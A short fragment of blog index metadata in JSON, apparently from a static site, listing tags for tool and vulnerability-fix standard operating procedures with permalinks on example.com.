​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]}],"categories":[],"tags":[{"name":"工具SOP","slug":"工具SOP","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7SOP/"},{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]}